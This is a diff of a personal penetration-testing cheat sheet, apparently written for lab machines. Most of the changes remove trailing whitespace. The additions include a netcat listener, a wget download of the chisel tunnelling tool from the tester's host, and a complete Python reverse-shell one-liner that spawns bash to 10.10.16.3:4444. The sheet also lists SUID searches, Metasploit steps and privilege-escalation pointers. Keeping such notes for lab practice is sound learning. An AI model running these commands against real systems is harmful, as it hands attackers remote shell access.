@@ -14,7 +14,7 @@ Example commands:
         -f or --mtu <number> (fragments packet to bypass firewall)
     ftp -p 10.129.42.253
         if anonymous access allowed: enter 'anonymous' as user
-        get <file.txt.> 
+        get <file.txt.>
             gets the file while in ftp
 
 dirsearch -u <URL>
@@ -23,9 +23,14 @@ searchsploit <keywords> <more keywords>
 telnet <ip>
 xfreerdp /v:10.129.227.82 /u:Administrator
 smbclient -N -L \\\\10.129.42.253
-    gets the file while in smbclient  
+    gets the file while in smbclient
 find / -user root -perm -4000 -exec ls -ldb {} \;
     find SUID (set owner userID upon execution) privileges
+nc -lnvp 4444
+  listen on port 4444
+python -m SimpleHTTPServer 80         
+    launch server for file transfer
+    wget 10.10.16.3:80/Documents/chisel
 
 Tools:
     searchsploit (find public vulnerabilities/exploits)
@@ -37,13 +42,13 @@ Tools:
             RHOSTS is target
         check
         exploit
-        spool 
+        spool
             console output to file
         save
             saves values
         db_nmap -sV 10.10.216.211 (this command saves stuff to database to look at later)
             hosts
-            vulns 
+            vulns
             services
         ip addr (shows ip address, likely tun0 on these)
         run -j (runs in background)
@@ -64,16 +69,16 @@ Tools:
 
 Windows:
     msconfig.exe
-    msinfo32.exe 
+    msinfo32.exe
     resmon.exe
     compmgmt.msc
-    hostname (cmd command) 
+    hostname (cmd command)
         computer name
     whoami (cmd)
         name of logged in user
     netstat
     net
-        manage network resources    
+        manage network resources
     regedt32.exe
 
 SQL injection:
@@ -93,6 +98,9 @@ Anonymous scan:
 
     look into linpeas
     also look into hosting tool online so i can wget it from a shell
+
+exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+  python3 reverse shell
 
 https://gtfobins.github.io/
     looks for privilege escalation
